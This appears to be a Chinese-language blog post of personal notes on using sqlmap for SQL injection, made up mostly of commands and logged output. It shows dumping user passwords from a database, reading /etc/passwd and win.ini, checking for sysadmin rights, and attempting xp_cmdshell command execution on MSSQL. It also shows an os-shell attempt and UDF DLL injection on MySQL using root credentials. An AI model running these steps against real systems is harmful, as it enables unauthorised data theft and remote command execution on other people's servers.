<h2 id="sqlmap注入方法">sqlmap注入方法</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">--current-user</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">--tables</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">-T</span> systemUser <span class="nt">--columns</span>

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">-D</span> aiweb1 <span class="nt">-T</span> systemUser <span class="nt">-C</span> <span class="nb">id</span>,password,userName

sqlmap <span class="nt">-r</span> Desktop/uid.txt <span class="nt">--file-read</span><span class="o">=</span><span class="s2">"/etc/passwd"</span>

sql-shell&gt; <span class="k">select </span>load_file<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span>

</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">查看数据库信息和系统版本</span>
<span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="p">@@</span><span class="nd">version</span>
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">select @@version</span><span class="dl">'</span>
<span class="nx">select</span> <span class="p">@@</span><span class="nd">version</span><span class="p">:</span>    <span class="dl">'</span><span class="s1">Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) </span><span class="se">\n\t</span><span class="s1">Apr  2 2010 15:48:46 </span><span class="se">\n\t</span><span class="s1">Copyright (c) Microsoft Corporation</span><span class="se">\n\t</span><span class="s1">Standard Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)</span><span class="se">\n</span><span class="dl">'</span>

<span class="nx">验证是否为sa权限</span>
<span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="nx">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="dl">'</span><span class="s1">sysadmin</span><span class="dl">'</span><span class="p">)</span>
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">select IS_SRVROLEMEMBER(</span><span class="dl">'</span><span class="nx">sysadmin</span><span class="dl">'</span><span class="s1">)</span><span class="dl">'</span>
<span class="nx">select</span> <span class="nx">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="dl">'</span><span class="s1">sysadmin</span><span class="dl">'</span><span class="p">):</span>    <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span>

<span class="nx">判断目标机的MSSQL服务是否存在</span><span class="s2">`xp_cmdshell`</span><span class="nx">扩展存储过程</span><span class="err">：</span>
<span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="nx">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="nx">master</span><span class="p">.</span><span class="nx">dbo</span><span class="p">.</span><span class="nx">sysobjects</span> <span class="nx">where</span> <span class="nx">xtype</span><span class="o">=</span><span class="dl">'</span><span class="s1">x</span><span class="dl">'</span> <span class="nx">and</span> <span class="nx">name</span><span class="o">=</span><span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">;</span>
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">select count(*) from master.dbo.sysobjects where xtype=</span><span class="dl">'</span><span class="nx">x</span><span class="dl">'</span><span class="s1"> and name=</span><span class="dl">'</span><span class="nx">xp_cmdshell</span><span class="dl">''</span>
<span class="nx">select</span> <span class="nx">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="nx">master</span><span class="p">.</span><span class="nx">dbo</span><span class="p">.</span><span class="nx">sysobjects</span> <span class="nx">where</span> <span class="nx">xtype</span><span class="o">=</span><span class="dl">'</span><span class="s1">x</span><span class="dl">'</span> <span class="nx">and</span> <span class="nx">name</span><span class="o">=</span><span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">;:</span>    <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span>
<span class="nx">只要返回结果不是</span><span class="s2">`0`</span><span class="nx">就说明存在</span><span class="s2">`xp_cmdshell`</span><span class="nx">扩展存储过程</span><span class="err">。</span>
</code></pre></div></div>
<h2 id="遇到问题">遇到问题</h2>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">Exec</span> <span class="nx">master</span><span class="p">..</span><span class="nx">xp_cmdshell</span> <span class="dl">'</span><span class="s1">whoami</span><span class="dl">'</span><span class="p">;</span>
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">execution</span> <span class="k">of</span> <span class="nx">non</span><span class="o">-</span><span class="nx">query</span> <span class="nx">SQL</span> <span class="nx">statements</span> <span class="nx">is</span> <span class="nx">only</span> <span class="nx">available</span> <span class="nx">when</span> <span class="nx">stacked</span> <span class="nx">queries</span> <span class="nx">are</span> <span class="nx">supported</span>
</code></pre></div></div>

<h2 id="how">how</h2>
<p>sqlmap -r /home/tool/sqlmap-data/wsdl-inject/net-test1.txt –batch –file-read=”C:\Windows\win.ini”</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span>
<span class="nx">web</span> <span class="nx">server</span> <span class="nx">operating</span> <span class="nx">system</span><span class="p">:</span> <span class="nx">Windows</span> <span class="mi">2008</span> <span class="nx">R2</span> <span class="nx">or</span> <span class="mi">7</span>
<span class="nx">web</span> <span class="nx">application</span> <span class="nx">technology</span><span class="p">:</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span> <span class="mf">4.0</span><span class="p">.</span><span class="mi">30319</span><span class="p">,</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="mf">7.5</span><span class="p">,</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span>
<span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="mi">2008</span>
<span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="nx">ERROR</span><span class="p">]</span> <span class="nx">none</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">techniques</span> <span class="nx">detected</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">read</span> <span class="nx">files</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">underlying</span> <span class="nx">file</span> <span class="nx">system</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="nx">server</span>
</code></pre></div></div>

<h2 id="os-shell">?os-shell?</h2>
<p>mysql:
select password(‘’),concat(‘*‘,sha1(unhex(sha1(‘’))));
sqlmap -d “mysql://root:Hehe123456@192.168.192.120:3306/test” –os-shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="s2">"hex"</span> into outfile <span class="s2">"D:/phpStudy/MySQL/lib/plugin/udf.dll"</span>
</code></pre></div></div>

<p>CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’;</p>
